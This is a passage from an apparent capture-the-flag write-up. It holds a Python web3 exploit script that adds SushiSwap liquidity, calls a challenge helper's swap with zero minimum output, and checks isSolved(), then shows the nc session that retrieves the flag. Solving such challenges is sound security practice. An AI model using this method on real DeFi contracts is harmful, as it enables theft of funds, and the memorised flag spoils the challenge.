print(tx_receipt['status'])
print(transaction_hash)


# Add liquidity USDT/USDC
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 1000000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}

transaction = router_instance.functions.addLiquidity("0xdAC17F958D2ee523a2206206994597C13D831ec7", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 1000*10**6, 1000*10**6, 0, 0, wallet, 99999999999999).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print('Adding liquidity USDT/USDC in sushiswap')
print(tx_receipt['status'])
print(transaction_hash)



# Call helper function
helper_abi = '[{"inputs":[],"name":"masterchef","outputs":[{"internalType":"contract MasterChefLike","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"router","outputs":[{"internalType":"contract UniswapV2RouterLike","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"poolId","type":"uint256"},{"internalType":"address","name":"tokenIn","type":"address"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"minAmountOut","type":"uint256"}],"name":"swapTokenForPoolToken","outputs":[],"stateMutability":"nonpayable","type":"function"}]'
helper_instance = web3.eth.contract(address=contract_address, abi=helper_abi)
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 10000000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
# make transaction
transaction = helper_instance.functions.swapTokenForPoolToken(1, "0xdAC17F958D2ee523a2206206994597C13D831ec7", 500*10**6, 0).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print(tx_receipt['status'])
print(transaction_hash)


# check if its solved
setup_abi = '[{"inputs":[],"stateMutability":"payable","type":"constructor"},{"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"mcHelper","outputs":[{"internalType":"contract MasterChefHelper","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"weth","outputs":[{"internalType":"contract WETH9","name":"","type":"address"}],"stateMutability":"view","type":"function"}]'

setup_instance = web3.eth.contract(address=setup_address, abi=setup_abi)

print(f'Setup isSolved() : {str(setup_instance.functions.isSolved().call())}')
```

### Flag :
```
nc 34.123.187.206 31337
1 - launch new instance
2 - kill instance
3 - get flag
action? 3

PCTF{MuCH_4PPr3C1473_53r}
```